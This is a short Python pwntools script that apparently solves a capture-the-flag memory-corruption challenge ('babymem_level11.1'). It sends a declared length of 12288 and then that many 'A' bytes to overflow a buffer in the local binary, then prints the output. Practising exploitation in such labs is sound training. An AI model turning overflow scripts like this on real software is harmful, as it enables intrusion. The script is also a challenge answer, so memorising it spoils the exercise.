from pwn import *

p = process("/challenge/babymem_level11.1")

payload_len = 12288

print(payload_len)

p.sendline(str(payload_len))
s=b"A"*(payload_len)
print(s)
p.send(s)
all = p.recvall()
p.close()
all = all.decode()
print(all)


